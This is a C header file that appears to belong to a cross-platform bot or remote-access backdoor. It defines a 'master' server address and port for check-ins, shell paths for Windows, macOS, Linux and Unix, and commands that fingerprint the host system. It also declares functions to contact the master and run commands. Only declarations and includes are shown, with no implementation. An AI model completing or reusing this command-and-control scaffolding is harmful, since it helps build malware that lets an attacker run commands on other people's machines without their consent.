
#define BUF_SIZE 8192
#define MASTER_IP "127.0.0.1"
#define MASTER_PORT 8080
#define MASTER_RECV_SIZE 4096
#ifdef _WIN32
    #warning "Compiling for Windows!"
    #define __windows__ //consistency
    #define SHELL "C:\\windows\\system32\\cmd.exe"
    #define OS "Windows"
    #define ID_CMD "VER"
    #include <windows.h> //windows stuff
    #include <io.h> //dup2
    #include <process.h> //exec
    #include <winsock2.h> //sockets
    #include <ws2tcpip.h>
    #include <iphlpapi.h>
    #pragma comment(lib,"ws2_32.lib")

    // structs taken from microsoft msdn
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms740496(v=vs.85).aspx
    typedef struct addrinfo {
        int             ai_flags;
        int             ai_family;
        int             ai_socktype;
        int             ai_protocol;
        size_t          ai_addrlen;
        char            *ai_canonname;
        struct sockaddr  *ai_addr;
        struct addrinfo  *ai_next;
    } ADDRINFOA, *PADDRINFOA;
     
    typedef struct sockaddr {
    #if (_WIN32_WINNT < 0x0600)
        u_short sa_family;
    #else 
        ADDRESS_FAMILY sa_family;
    #endif //(_WIN32_WINNT < 0x0600)
        CHAR sa_data[14];
    } SOCKADDR, *PSOCKADDR, FAR *LPSOCKADDR;
    
    typedef struct sockaddr_in {
    #if(_WIN32_WINNT < 0x0600)
        short   sin_family;    
    #else //(_WIN32_WINNT < 0x0600)
        ADDRESS_FAMILY sin_family;
    #endif //(_WIN32_WINNT < 0x0600)
        USHORT sin_port;
        IN_ADDR sin_addr;
        CHAR sin_zero[8];
    } SOCKADDR_IN, *PSOCKADDR_IN;
    
#elif __APPLE__
    #include "TargetConditionals.h"
    #if TARGET_OS_MAC
        #warning "Compiling for Mac!"
        #define __apple__ //consistency
        #define SHELL "/bin/bash"
        #define OS "Mac (Unix)"
        #define ID_CMD "sw_vers"
        #include <unistd.h> //dup, fork, exec, etc
        #include <arpa/inet.h> //inet_ntoa
        #include <netinet/in.h> //in_addr
        #include <sys/socket.h> //socket
        #include <string.h> //strlen
    #else
    #   error "Unsupported OS"
    #endif
#elif __linux__
    #warning "Compiling for Linux!"
    #define SHELL "/bin/bash"
    #define OS "Linux"
    #define ID_CMD "cat /etc/*releases || lsb_release -a || cat /proc/version"
    #include <unistd.h>
#elif __unix__
    #warning "Compiling for Unix!"
    #define SHELL "/bin/sh"
    #define OS "Unix"
    #define ID_CMD "uname -a"
    #include <unistd.h>
#else
#   error "Unsupported OS"
#endif

char *get_os();
char *master_checkin(struct sockaddr_in master, char * data);
int master_init(struct sockaddr_in *master);

char *run_cmd(char *cmd, char **param);
